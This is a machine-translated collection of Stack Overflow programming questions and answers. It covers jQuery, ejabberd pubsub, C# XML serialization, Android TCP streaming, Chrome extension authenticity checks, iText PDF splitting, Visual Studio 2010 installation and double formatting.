这是一个动态创建的过滤器列表。单击帐户链接将打开一个模式窗口，其中包含帐户名称列表。单击帐户名称会导致 li 元素出现在过滤器侧边栏中。问题是您此时可以多次单击链接并创建一个元素，即使它是相同的信息。我需要它做的是每个帐户列表只创建一个 li 。我考虑过使用 not () 选择器并在单击帐户名称时在操作末尾添加一个类。问题是它们都共享同一个 .account 类，这就是 JQuery 在单击时执行操作的方式。我的问题是首先我如何让它工作，因为我的 not () 行没有触发。第二，我如何让它只针对用户点击的一个项目，而不是与帐户类别的所有链接？这是 JSFiddle，但由于某种原因，它不想完全工作，因为该站点有很多来自 Bootstrap 的代码：[http://jsfiddle.net/rsxavior/puhdE/7/](http://jsfiddle.net/rsxavior/puhdE/7/)

这是我指的相关代码：

```
<li>
    <a href="#accountModal" data-toggle="modal">Accounts</a>
    <!--Start Account Sort Modal-->
    <div class="modal hide" id="accountModal" tabindex="-1" role="dialog" aria-labelledby="accountLabel" aria-hidden="true">
        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
            <hgroup>
                <h4 id="accountLabel">Accounts</h4>
                <h6>(Choose an account's first letter to quickly sort)</h6>
            </hgroup>
            <ul class="nav nav-pills">
                <li><a href="#">A</a></li>
                <li><a href="#">B</a></li>
                <li><a href="#">C</a></li>
                <li><a href="#">D</a></li>
                <li><a href="#">E</a></li>
                <li><a href="#">F</a></li>
                <li><a href="#">G</a></li>
                <li><a href="#">H</a></li>
                <li><a href="#">I</a></li>
                <li><a href="#">J</a></li>
                <li><a href="#">K</a></li>
                <li><a href="#">L</a></li>
                <li><a href="#">M</a></li>
                <li><a href="#">N</a></li>
                <li><a href="#">O</a></li>
                <li><a href="#">P</a></li>
                <li><a href="#">Q</a></li>
                <li><a href="#">R</a></li>
                <li><a href="#">S</a></li>
                <li><a href="#">T</a></li>
                <li><a href="#">U</a></li>
                <li><a href="#">V</a></li>
                <li><a href="#">W</a></li>
                <li><a href="#">X</a></li>
                <li><a href="#">Y</a></li>
                <li><a href="#">Z</a></li>
            </ul>
        </div>
        <div class="modal-body">
            <ul>
                <li class="account"><a href="#">All</a></li>
                <li class="account"><a href="#">A Name</a></li>
                <li class="account"><a href="#">Another Account Name</a></li>
                <li class="account"><a href="#">Babcock Center</a></li>
            </ul> 
        </div>
        <div class="modal-footer">
            <ul class="pager">
                <li><a href="#">Prev</a></li>
                <li><a href="#">Next</a></li>
            </ul>
        </div>
    </div>
    <ul class="account-hidden-li"></ul>
</li> 
```

JQuery 随之而来：

```
$('.account:not('.selected-account')').click(function () {
    $('.account-hidden-li').append('<li class="account-select">Sample Account Name<a class="close" data-dismiss="alert" href="#">&times;</a></li>');
    $('.account').addClass('selected_account');
)}; 
```

在这件事上的任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:34:22.493

```
$(".account").click(function () {
this.unbind("click");
    $('.account-hidden-li').append('<li class="account-select">Sample Account Name<a class="close" data-dismiss="alert" href="#">&times;</a></li>');
    $('.account').addClass('selected_account'); 
```

});

# xmpp - 在存在接收已发布项目两次 ejabberd

> ID：12460288
> 
> 赞同：0
> 
> 时间：2012-09-17T13:29:49.257
> 
> 标签：xmpp, publish-subscribe, ejabberd

我正在开发一个 xmpp 客户端，目前正在开发“pubsub”。我在 pubsub 中创建了一个节点并订阅了两个用户。但是，当订阅者登录（显示存在）时，我会两次获得最后发布的项目。我正在使用 ejabberd 服务器。有人可以帮忙吗？？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-01-04T01:16:34.080

同样在这里，

似乎有两个不同的队列。使用*notification_type=normal*，消息离线存储。当接收者上线时，它会收到两次消息：

*   来自离线假脱机，没有标题属性
*   从 pubsub 发送循环（因为节点仍然配置了 send_last_published_item = on_sub_and_presence）

如此处所述[，在使用](https://github.com/processone/ejabberd/issues/827)*notification_type=normal*配置 pubsub 节点时，最好禁用 send_last_published_item 或仅将其设置为 on_sub 以避免收到两次消息。

# c# - XML序列化从接口派生的通用对象列表，，，

> ID：12460289
> 
> 赞同：4
> 
> 时间：2012-09-17T13:29:49.413
> 
> 标签：c#, xml, generics, serialization, interface

所以我试图 XML 序列化`List<IObject>`从接口派生的，但它们`IObjects`是泛型类型......最好使用代码：

```
public interface IOSCMethod
{
    string Name { get; }
    object Value { get; set; }
    Type Type { get; }
}

public class OSCMethod<T> : IOSCMethod
{
    public string Name { get; set; }
    public T Value { get; set; }
    public Type Type { get { return _type; } }

    protected string _name;
    protected Type _type;

    public OSCMethod() { }

    // Explicit implementation of IFormField.Value
    object IOSCMethod.Value
    {
        get { return this.Value; }
        set { this.Value = (T)value; }
    }
} 
```

我有一个 IOSCMethods 列表：

```
List<IOSCMethod> 
```

我通过以下方式添加对象：

```
 List<IOSCMethod> methodList = new List<IOSCMethod>();
        methodList.Add(new OSCMethod<float>() { Name = "/1/button1", Value = 0 });
        methodList.Add(new OSCMethod<float[]>() { Name = "/1/array1", Value = new float[10] }); 
```

这**`methodList`**就是我要序列化的内容。但是每次我尝试时，要么我得到一个“无法序列化接口”，但是当我实现它（无论是类`IOSCMethod`还是`OSCMethod<T>`类）时`IXmlSerializable`，我都会遇到“无法使用无参数构造函数序列化对象”的问题。但显然我不能，因为它是一个界面！蹩脚的裤子。

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-21T17:16:37.010

这是你想要的吗：

```
[TestFixture]
public class SerializeOscTest
{
    [Test]
    public void SerializeEmpTest()
    {
        var oscMethods = new List<OscMethod>
                             {
                                  new OscMethod<float> {Value = 0f}, 
                                  new OscMethod<float[]> {Value = new float[] {10,0}}
                              };
        string xmlString = oscMethods.GetXmlString();
    }
}

public class OscMethod<T> : OscMethod
{
    public T Value { get; set; }
}

[XmlInclude(typeof(OscMethod<float>)),XmlInclude(typeof(OscMethod<float[]>))]
public abstract class OscMethod
{

}

public static class Extenstion
{
    public static string GetXmlString<T>(this T objectToSerialize)
    {
        XmlSerializer xmlSerializer = new XmlSerializer(objectToSerialize.GetType());
        StringBuilder stringBuilder = new StringBuilder();
        string xml;
        using (var xmlTextWriter = new XmlTextWriter(new StringWriter(stringBuilder)))
        {
            xmlSerializer.Serialize(xmlTextWriter, objectToSerialize);
            xml = stringBuilder.ToString();
        }
        return xml;
    }
} 
```

# android - Android / Windows TCP 客户端-服务器性能问题

> ID：12460294
> 
> 赞同：0
> 
> 时间：2012-09-17T13:30:03.220
> 
> 标签：android, tcp, client-server

我写了 2 个应用程序：一个用于 android，使用 ServerSocket：

```
try {
    ServerSocket serverSocket = new ServerSocket(3215);
    while (true) {
        try {
            mConnected = false;
            if (mAllowed) {
                sendStatusReport(STATUS_IS_ALLOWED);
            } else {
                sendStatusReport(STATUS_IS_DENIED);
            }
            Socket socket = serverSocket.accept();

            wakeLock.acquire();
            DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
            if (mAllowed) {
                mConnected = true;
                sendStatusReport(STATUS_IS_CONNECTED);
                while (mAllowed) {
                    byte[] png = takeScreenshot();
                    outputStream.writeInt(png.length);

                    outputStream.write(png);
                }
                outputStream.writeLong(0);
            } else {
                outputStream.writeLong(0);
            }
            wakeLock.release();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

} catch (UnknownHostException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
} 
```

另一个使用 C++ 的 Windows：

```
 int recv_count = 0, data_length = 0;
    const int block_size = 1024*8;
    unsigned char * data;
    unsigned char * ptr = data;
    int received_total = 0;
    int bytes_to_receive = 0;

while (received_total < data_length)
{
    if (data_length - received_total < block_size)
    {
        bytes_to_receive = data_length - received_total;
        log::obj()(this, "Left to receive %u bytes of %u, total: %u...", bytes_to_receive, data_length, received_total);
    }
    else
    {
        bytes_to_receive = block_size;
    }

    #define MSG_WAITALL 0x8
    recv_count = recv(client_socket, (char*)ptr, bytes_to_receive, MSG_WAITALL);

    if (recv_count != bytes_to_receive)
    {
        log::obj()(this, log::warning, "Received %u bytes instead of %u!", recv_count, bytes_to_receive);
    }

    ptr += recv_count;
    received_total += recv_count;
} 
```

问题是客户端通过 WiFi 以 < 2FPS 的速度接收帧（~1MB），并且当屏幕关闭时，FPS 会低至 0.2FPS（有和没有 PARTIAL_WAKE_LOCK）。服务在前台运行。

```
log::obj()(this, log::warning, "Received %u bytes instead of %u!", recv_count, bytes_to_receive); 
```

表示没有 MSG_WAITALL 客户端每次接收调用接收 ~500-1000 字节而不是“block_size”。

我是初学者，不明白表现不佳的原因。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:43:26.817

尝试缓冲您的输出流，否则，每次写入都可能发送一个数据包。

```
 DataOutputStream outputStream = new DataOutputStream( new BufferedOutputStream(socket.getOutputStream()));
        if (mAllowed) {
            mConnected = true;
            sendStatusReport(STATUS_IS_CONNECTED);
            while (mAllowed) {
                byte[] png = takeScreenshot();
                outputStream.writeInt(png.length);

                outputStream.write(png);
            }
            outputStream.writeLong(0);
        } else {
            outputStream.writeLong(0);
        }
        outputStream.flush(); 
```

唯一更改的行是第一行和最后一行。

# javascript - 如何检查 Chrome 扩展程序的真实性？

> ID：12460297
> 
> 赞同：15
> 
> 时间：2012-09-17T13:30:07.893
> 
> 标签：javascript, security, google-chrome, google-chrome-extension

### 上下文：

*   只有当您的客户端安装了您的特定 Chrome 扩展程序时，您的 Web 服务器才必须提供独家内容。
*   您有两种可能提供 Chrome 扩展包：
    1.  来自 Chrome 网上应用店
    2.  从您自己的服务器

### 问题：

*   有很多解决方案可以让您知道已安装 Chrome 扩展程序：
    1.  [在使用内容脚本](http://developer.chrome.com/extensions/content_scripts.html)加载网页时插入元素。
    2.  使用[Web Requests](http://developer.chrome.com/extensions/webRequest.html)将特定标头发送到服务器。
    3.  等等。
*   但是似乎没有解决方案来检查与您的网页交互的 Chrome 扩展程序是否是正版的。
*   实际上，由于任何人都可以查看和复制 Chrome 扩展程序的源代码，**因此似乎无法知道当前与您的网页交互的 Chrome 扩展程序是您发布**的版本还是克隆版本（并且可能有所改变）由另一个人。
*   您似乎只能知道某些 Chrome 扩展程序正在以“预期方式”与您的网页交互，但您无法验证其真实性。

### 解决方案？

*   一种解决方案可能是使用 Chrome 扩展包中包含的信息，其他任何人都无法更改或复制这些信息：
    1.  将 Chrome 扩展程序的 ID 发送到服务器？但是怎么做？
        *   ID 必须由您和您的 JavaScript 代码发送，并且似乎无法使用“内部”Chrome 功能来完成。
        *   因此，如果其他人只是将相同的 ID 发送到您的服务器（某种 Chrome 扩展程序的 ID 欺骗），那么您的服务器会认为他的 Chrome 扩展程序是真实的！
    2.  使用打包应用程序时提供的私钥？但是怎么做？
        *   似乎无法以任何方式以编程方式访问或使用此密钥！
*   另一种解决方案是使用[NPAPI 插件](http://developer.chrome.com/extensions/npapi.html)并嵌入 GPG 等身份验证方法。但这种解决方案并不理想，主要是因为其[API 文档](http://developer.chrome.com/extensions/npapi.html)的“警告”部分很大。
*   ***还有其他解决方案吗？***

### 笔记

这个问题试图在 Chrome 扩展的 API 中提出一个真正的安全问题：如何在与您的服务交互时检查您的 Chrome 扩展的真实性。如果有任何遗漏的可能性，或者任何误解，请随时在评论中问我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-19T20:36:22.587

很抱歉，您提出的这个问题本质上是无法解决的，因为一个简单的问题：**您不能信任客户。**而且由于客户可以看到代码，因此您无法解决问题。

来自客户端的任何信息都可以通过其他方式复制。这与试图证明当用户登录到他们的帐户时实际上是用户而不是其他人发现或被给予他们的用户名和密码时，本质上是相同的问题。

互联网安全模型是围绕 2 方建立的，它们试图在没有第三方能够模仿、修改或收听对话的情况下进行通信。如果不隐藏扩展程序的源代码，客户端将与第三方无法区分（副本之间的文件 - 无法确定哪个是哪个）。

如果源代码被隐藏，那就完全是另一回事了。现在，用户或恶意方无法访问真实客户端知道的秘密，并且所有常规安全模型都适用。然而，Chrome 是否允许在扩展中隐藏源代码是值得怀疑的，因为它会产生其他安全问题。

如您所述，可以使用 NPAPI 插件隐藏一些源代码，但您已经知道它的价格。

* * *

回到目前的状态：

现在它变成了交互的含义的问题。

如果交互意味着当用户在页面上时您想知道它是您的扩展程序还是其他页面，那么您可以获得的最接近的方法是在*应用程序*部分下的扩展程序清单中列出您的页面，如此[处所述](https://developers.google.com/chrome/apps/docs/developers_guide#manifest)

这将允许您在页面上询问是否通过使用安装了应用程序

```
 chrome.app.isInstalled 
```

这将返回布尔值，显示您的应用程序是否已安装。该命令记录[在这里](https://developers.google.com/chrome/web-store/docs/inline_installation#already-installed)

然而，这并不能真正解决问题，因为扩展程序可能已安装，但未启用，并且还有另一个扩展程序模拟与您的站点的通信。

此外，验证在客户端，因此任何使用该验证的函数都可以被覆盖以忽略此变量的结果。

但是，如果交互意味着生成 XMLHttpRequests，那么您就不走运了。由于上面讨论的源代码的可见性，无法使用当前方法完成。

但是，如果它**限制您的站点对授权实体的可用性，**我建议使用常规的身份验证方式：让用户登录将允许您创建会话。此会话将传播到扩展程序发出的所有请求，因此您可以解决常规客户端登录信任问题，例如帐户共享等。这些当然可以通过让用户通过他们的 Google 帐户登录来管理，大多数人都不愿意通过阻止似乎被滥用的帐户来分享和进一步缓解。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-21T12:50:26.593

我建议做一些类似于 Git 使用的事情（看看[http://git-scm.com/book/en/Git-Internals-Git-Objects](http://git-scm.com/book/en/Git-Internals-Git-Objects)以了解 git 如何实现它），即

> **创建 chrome 扩展中每个文件内容的 SHA1 值，**然后重新创建之前获得的连接 SHA1 值的另一个 SHA1 值。

通过这种方式，您可以与您的服务器共享 SHA1 值并验证您的扩展，因为 SHA1 值会更改，以防万一有人更改您的任何文件。

用一些伪代码更详细地解释它：

```
function get_authentication_key(){

    var files = get_all_files_in_extension,
        concatenated_sha_values = '',
        authentication_key;

    for(file in files){
        concatenated_sha_values += Digest::SHA1.hexdigest(get_file_content(file));
    }

    $.ajax({
  url: 'http://example.com/getauthkey',
  type: 'post'
  async: false,
  success:function(data){
         authentication_key = data;
  }
    })

    //You may return either SHA value of concatenated values or return the concatenated SHA values
    return authentication_key;  
}

// Server side code
get('/getauthkey') do
    // One can apply several type of encryption algos on the string passed, to make it unbreakable
authentication_key = Digest::<encryption>.hexdigest($_GET['string']);
return authentication_key;
end 
```

此方法允许您检查任何类型的文件是否已更改，可能是图像文件或视频文件或任何其他文件。很高兴知道这东西是否也能被打破。

# java - 如何使用 itext 多级阅读 PDF 中的书签？

> ID：12460302
> 
> 赞同：0
> 
> 时间：2012-09-17T13:30:16.783
> 
> 标签：java, pdf, itext

我正在使用 iText-Java 在书签级别拆分 PDF。有没有人知道或有任何在 2 级或 3 级存在的书签处拆分 PDF 的示例？例如：我有以下级别的书签：

父亲
| -儿子
| - 儿子 |-女儿 |-|-孙子
| -|-孙女

现在我有下面的代码来读取读取基本书签（父亲）的书签。基本上 SimpleBookmark.getBookmark(reader) 行完成了所有工作。

但我想阅读 2 级和 3 级书签来拆分这些内层书签之间存在的内容。

```
public static void splitPDFByBookmarks(String pdf, String outputFolder){ 
        try
        { 
            PdfReader reader = new PdfReader(pdf); 
            //List of bookmarks: each bookmark is a map with values for title, page, etc 
            List<HashMap> bookmarks = SimpleBookmark.getBookmark(reader); 
            for(int i=0; i<bookmarks.size(); i++){ 
                HashMap bm = bookmarks.get(i); 
                HashMap nextBM = i==bookmarks.size()-1 ? null : bookmarks.get(i+1); 
                //In my case I needed to split the title string 
                String title = ((String)bm.get("Title")).split(" ")[2]; 

                log.debug("Titel: " + title); 
                String startPage = ((String)bm.get("Page")).split(" ")[0]; 
                String startPageNextBM = nextBM==null ? "" + (reader.getNumberOfPages() + 1) : ((String)nextBM.get("Page")).split(" ")[0]; 
                log.debug("Page: " + startPage); 
                log.debug("------------------"); 
                extractBookmarkToPDF(reader, Integer.valueOf(startPage), Integer.valueOf(startPageNextBM), title + ".pdf",outputFolder); 
            } 
        } 
        catch (IOException e) 
        { 
            log.error(e.getMessage()); 
        } 
    } 

    private static void extractBookmarkToPDF(PdfReader reader, int pageFrom, int pageTo, String outputName, String outputFolder){ 
        Document document = new Document(); 
        OutputStream os = null; 

        try{ 
            os = new FileOutputStream(outputFolder + outputName); 

            // Create a writer for the outputstream 
            PdfWriter writer = PdfWriter.getInstance(document, os); 
            document.open(); 
            PdfContentByte cb = writer.getDirectContent(); // Holds the PDF data 
            PdfImportedPage page; 

            while(pageFrom < pageTo) { 
                document.newPage(); 
                page = writer.getImportedPage(reader, pageFrom); 
                cb.addTemplate(page, 0, 0); 
                pageFrom++; 
            } 

            os.flush(); 
            document.close(); 
            os.close(); 
        }catch(Exception ex){ 
            log.error(ex.getMessage()); 
        }finally { 
            if (document.isOpen()) 
                document.close(); 
            try { 
                if (os != null) 
                    os.close(); 
            } catch (IOException ioe) { 
                log.error(ioe.getMessage()); 
            } 
        } 
    } 
```

非常感谢您的帮助。提前致谢！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T12:38:57.473

`ArrayList<HashMap>`当你打电话时你会得到一个`SimpleBookmark.getBookmark(reader);`（如果你需要的话，做演员）。尝试遍历该 Arraylist 并查看其结构。如果书签有子（如您所说），它将包含另一个具有相同结构的列表。

递归方法可能是解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-12-03T13:58:52.777

给那些使用 itext7 看这个的人的参考

```
public void walkOutlines(PdfOutline outline, Map<String, PdfObject> names, PdfDocument pdfDocument,List<String>titles,List<Integer>pageNum) { //----------loop traversing all paths

for (PdfOutline child : outline.getAllChildren()){
    if(child.getDestination() != null) {
        prepareIndexFile(child,names,pdfDocument,titles,pageNum,list);
    }
  }
} 
```

//-----从大纲中获取pageNumbers

```
 public void prepareIndexFile(PdfOutline outline, Map<String, PdfObject> names, PdfDocument pdfDocument,List<String>titles,List<Integer>pageNum) {

    String title = outline.getTitle();

    PdfDestination pdfDestination = outline.getDestination();
    String pdfStr = ((PdfString)pdfDestination.getPdfObject()).toUnicodeString();
    PdfArray array = (PdfArray) names.get(pdfStr);
    PdfObject pdfObj = array != null ? array.get(0) : null;

    Integer pageNumber = pdfDocument.getPageNumber((PdfDictionary)pdfObj);

    titles.add(title);
    pageNum.add(pageNumber);

    if(outline.getAllChildren().size() > 0) {

        for (PdfOutline child : outline.getAllChildren()){
            prepareIndexFile(child,names,pdfDocument,titles,pageNum);
        }

    }

 }

 public boolean splitPdf(String inputFile, final String outputFolder) {

    boolean splitSuccess = true;
    PdfDocument pdfDoc = null;
    try {
        PdfReader pdfReaderNew = new PdfReader(inputFile);
        pdfDoc = new PdfDocument(pdfReaderNew);

        final List<String> titles = new ArrayList<String>();
        List<Integer> pageNum = new ArrayList<Integer>();

        PdfNameTree destsTree = pdfDoc.getCatalog().getNameTree(PdfName.Dests);
        Map<String, PdfObject> names = destsTree.getNames();//--------------------------------------Core logic for getting names
        PdfOutline root = pdfDoc.getOutlines(false);//--------------------------------------Core logic for getting outlines

        walkOutlines(root,names, pdfDoc, titles, pageNum,content);  //------Logic to get bookmarks and pageNumbers

        if (titles == null || titles.size()==0) {
            splitSuccess = false;
        }else {                                                             //------Proceed if it has bookmarks

            for(int i=0;i<titles.size();i++) {

                 String title = titles.get(i);
                 String startPageNmStr =""+pageNum.get(i);
                 int startPage = Integer.parseInt(startPageNmStr);

                 int endPage = startPage;

                 if(i == titles.size() - 1) {
                     endPage = pdfDoc.getNumberOfPages();
                 }else {
                     int nextPage =  pageNum.get(i+1);
                     if(nextPage > startPage) {
                         endPage = nextPage - 1;
                     }else {
                         endPage = nextPage;
                     }
                 }

                 String outFileName = outputFolder + File.separator + getFileName(title) + ".pdf";
                 PdfWriter pdfWriter = new PdfWriter(outFileName);

                 PdfDocument newDocument = new PdfDocument(pdfWriter, new DocumentProperties().setEventCountingMetaInfo(null));
                 pdfDoc.copyPagesTo(startPage, endPage, newDocument);
                 newDocument.close();
                 pdfWriter.close();
            }
        }
    }catch(Exception e){
        //---log
    }       
 } 
```

# visual-studio-2010 - 安装 Visual Studio 2010（任何版本）仅在 C++ 头文件目录中安装 2 个文件

> ID：12460307
> 
> 赞同：30
> 
> 时间：2012-09-17T13:30:31.227
> 
> 标签：visual-studio-2010, visual-c++, installation, windows-installer, header-files

我在我的 Windows 7 工作站上安装了 Visual Studio 2010 Premium。加载一个测试 C++ 项目后，我注意到它找不到 iostream。我查看了*C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include*并注意到这里只存在两个文件，srv.h 和 wmiatlprov.h

我在一个测试虚拟机上安装了 VS2010 产品，这个目录（*...\VC\include*）充满了通常的文件夹和标题集合（您希望在包含目录中找到的材料。）

我已采取以下步骤来纠正问题工作站上缺少的标头：

*   已验证我没有激活 A/V 软件（我正在使用 MS Security Essentials，实时已禁用）
*   从程序和功能中卸载 Visual Studio 2010 Premium 和所有其他子产品
*   使用 /full 和 /netfx 参数运行 VS2010 卸载工具
*   从 Program Files 和 Program Files (x86) 中删除了 Visual Studio 10.0 目录
*   从 MSDN 新下载的 ISO 重新安装了 Visual Studio 2010。

我也完成了上述步骤，但使用了不同的版本进行重新安装，VS2010 Professional。

到目前为止，以上任何内容都无法生成已安装的 Visual Studio 2010 产品，并且在我的工作站上安装了所有 C++ 头文件。

想法？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-05-16T13:26:20.977

该问题的解决方案如下。它基于给出的解决方案

[http://connect.microsoft.com/VisualStudio/feedback/details/774158/re-installed-visual-studio-2010-and-c-standard-headers-are-missing](http://connect.microsoft.com/VisualStudio/feedback/details/774158/re-installed-visual-studio-2010-and-c-standard-headers-are-missing)

*   卸载 Visual Studio 2010。
*   卸载 Visual Studio 2010 SP1（尽管它给出了警告）。
*   打开注册表编辑器 (regedit)。
*   搜索名为 PaddedVersion 的键
*   删除任何父键 VisualStudio\10.0\VC\Libraries 或类似键（请注意版本号 10.0，它对应于 2010）。删除所有这些注册表路径。搜索 PaddedVersion 键只是为了简化此搜索。
*   安装 Visual Studio 2010。
*   安装 Visual Studio 2010 SP1。

这个解决方案可能不是最小的，但它对我有用。希望其他人可以确认。这里的重要区别在于，它不仅仅是必须从中删除注册表路径的 HKEY_LOCAL_MACHINE，如上面的链接所示。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-03T22:47:06.213

在对这个主题进行一些研究时，似乎无论您如何卸载 Visual Studio，总会留下一些碎片。

**要考虑的两个选项。**

**选项 1** 在虚拟机上安装 VS 2010。从您的虚拟机压缩所需的文件。将它们复制并解压缩到工作站。

**选项 2** 格式化硬盘。安装 Windows 7 的新副本。安装新副本 VS 2010。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-19T09:25:23.783

我尝试了几轮卸载和重新安装。最终奏效的破解方法是从安装了 VS 2010 的机器上复制 VC 文件夹的全部内容。您可能不需要复制所有这些，但我在 VC 中的 include、lib 和其他文件夹中丢失了 3000 多个文件。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-16T16:33:53.380

委婉地说，Visual Studio 安装程序是一个善变的野兽。一般诊断是您的注册表是脏的，有一个安装的 VS 子组件的记录，而它实际上不再存在。有*很多*子组件和大量的注册表项来跟踪它们的安装状态和配置。找到这么脏的钥匙背是一个严重的大海捞针问题。

如果您曾经安装过测试版或 RC 版，这种注册表损坏*非常常见。*我从来没有一个测试版在安装 RTM 版本时不会给我带来很大的问题。VS2010 测试版对我来说尤其糟糕，尽管我在没有卸载测试版的情况下更新到 Windows7 让我的脚踩得很惨。一个巨大的混乱，委婉地说。你可以期待类似的剧变，你曾经有一个没有完成的卸载/安装。当然，注册表损坏总是会变成痛苦。

这个问题很常见，有一些 Visual Studio 清理工具旨在在发生此类事情后清除注册表。对于VS2010，其实有好几个。谷歌“vs2010卸载实用程序”找到它们。不知道它们是否有所不同，我没有理由想到不只是运行它们。

当仍然无法解决问题时，芯片严重下降。剩下的就是挖掘安装后留在 TEMP 目录中的 dd*.txt 文件。它们包含安装程序决定的详细跟踪。请注意，您会淹没在大量数据中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-10-28T19:16:28.653

当 VS 2010 Web 安装程序第一次未能正确安装时，我在 Windows 8.1 上遇到了这个问题。我按照上面 Kaba 的步骤略有不同，它为我解决了问题（非常感谢 Kaba）。不同之处在于我删除了所有“VisualStudio\10.0”键及其所有子键，以及“VisualStudio\10.0_Config”和子键。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-01-19T22:10:22.993

[http://connect.microsoft.com/VisualStudio/feedback/details/774158/re-installed-visual-studio-2010-and-c-standard-headers-are-missing](http://connect.microsoft.com/VisualStudio/feedback/details/774158/re-installed-visual-studio-2010-and-c-standard-headers-are-missing)的解决方案对我不起作用。

卸载 Visual Studio 2010 和 SP1 后，我使用了注册表清理软件 CCleaner 并再次安装。它修复了。

# c# - x86 和 x64 上的双重格式不同

> ID：12460310
> 
> 赞同：2
> 
> 时间：2012-09-17T13:30:37.370
> 
> 标签：c#, .net, number-formatting

给定以下测试：

```
[Fact]
public void FactMethodName()
{
    var d = 6.4133;
    var actual = d.ToString("R");
    Assert.Equal("6.4133", actual);
} 
```

它在 x86 上传递，但不在任何 CPU 或 x64 上：

```
Assert.Equal() Failure
Position: First difference is at position 5
Expected: 6.4133
Actual:   6.4132999999999996 
```

问题是为什么会这样？请注意，并非所有双精度值都以这种方式运行。

我了解浮点问题。无需将我指向维基百科。无需指出测试是不正确的——它只是说明了问题——`Console.WriteLine(..);`如果你愿意，可以将其更改为。

**更新**我删除了对测试运行者的提及，因为这些细节被证明是无关紧要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T16:23:50.400

我认为秘诀在于使用“R”格式字符串（[查看更多信息](http://msdn.microsoft.com/en-us/library/dwhawy9k.aspx#RFormatString)）

"When a Single or Double value is formatted using this specifier, it is first tested using the general format, with 15 digits of precision for a Double and 7 digits of precision for a Single. If the value is successfully parsed back to the same numeric value, it is formatted using the general format specifier. If the value is not successfully parsed back to the same numeric value, it is formatted using 17 digits of precision for a Double and 9 digits of precision for a Single."

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-17T14:03:54.087

正如 Raj 和 ja72 指出的那样，问题在于数字舍入，我意识到您的测试只是问题的一个说明，但在现实世界的测试中，您应该避免这些逻辑错误。特别要避免强制转换为字符串或调用任何其他可能会影响测试成功的副作用的方法。

不幸的是，这通常被称为脆弱测试。它有时适用于某些机器。如果您在一个开发团队中工作（尤其是具有构建服务器或离岸或近岸团队的团队），那么这样的测试可能值得获得 [Works on my machine 奖](http://www.codinghorror.com/blog/2007/03/the-works-on-my-machine-certification-program.html)。

# linq - LightSwitch 2012 - 使用复合键

> ID：12460311
> 
> 赞同：0
> 
> 时间：2012-09-17T13:30:38.403
> 
> 标签：linq, visual-studio-lightswitch, composite-key

我目前正在从事的项目是连接到 OData 服务以从 Oracle 数据库中检索数据。使用 LINQPad 我可以执行查询，并返回我期望的数据。我在使用 LightSwitch 时遇到的问题是使用复合键。

这是我正在使用的 LINQ 语句：

```
from s in SYP_PROJECTS
where s.SYP_PRO_DISTNO == 5
where s.SYP_PRO_ITEMNO == Decimal.Parse("15.1")
select s 
```

如何对具有复合键的数据源使用 LINQ 语句，并从 LightSwitch 传递参数？

![实体](../Images/e46428749355161e896cb025f8118af9.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T18:02:16.517

以下代码回答了我原来的问题

```
 partial void ReturnFromCode_PreprocessQuery(string DistrictNo, ref IQueryable<SYP_PROJECT> query)
    {
        query = (from myProjects in query
                 where myProjects.SYP_PRO_DISTNO == Int16.Parse(DistrictNo) 
                 //where myProjects.SYP_PRO_DISTNO == 5 && myProjects.SYP_PRO_ITEMNO == Decimal.Parse("15.1")
                 orderby myProjects.SYP_PRO_DISTNO descending
                 select myProjects);
    }
} 
```

# javascript - 检查页面是否正在刷新或导航到另一个页面

> ID：12460315
> 
> 赞同：1
> 
> 时间：2012-09-17T13:30:47.840
> 
> 标签：javascript, asp.net, page-refresh

如果我的页面正在导航到其他页面或关闭，我想删除所有 cookie，否则我想让页面正常刷新。这样做的原因是[Clearing cookie for tabs](https://stackoverflow.com/questions/12453641/jquery-tabs-with-cookies)。

所以我的问题是：
我们如何才能知道页面是刷新还是导航或关闭？

我尝试使用

```
window.onbeforeunload = function() {
    var old_url= window.location.href;
    var new_url=  /* I dont know how to get new URL here */;
    if(old_url == new_url){
      return true;
    }
    else {
      return false;
    }
} 
```

它不起作用:(
还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:25:47.550

我在javascript中声明了一个全局变量。

```
<script type="text/javascript">
  var is_refresh_true = true;
</script> 
```

每当我尝试使用 javascript 刷新页面时，我只是将变量值更改为 false
**例如：**

```
<script type="text/javascript">
   function Callme(){  
      is_refresh_true = false;
      window.location.href = window.location.href;
    }
</script> 
```

还有身体的 onUnload 事件：

```
 function DeleteCokies() {            
     if (is_refresh_true) {
            deleteAllCookies();
     }
 } 
```

Its not a perfect solution but works for me.
Still I am waiting for perfect answer. Please reply if anyone finds it.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:44:05.037

If you don't set any Expiration for the cookie, it will be cleared with the session(ie., when you close the browser)..

If you are navigating to other pages, I don't see any problem with those cookies on other pages.. and suppose if you are coming back to the same page again, it will show the same tab..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-10T12:57:17.200

```
var confirmOnPage = function () {

   function del_cookie(name)
   {
       document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
   } 
```

};

window.onbeforeunload = confirmOnPage;

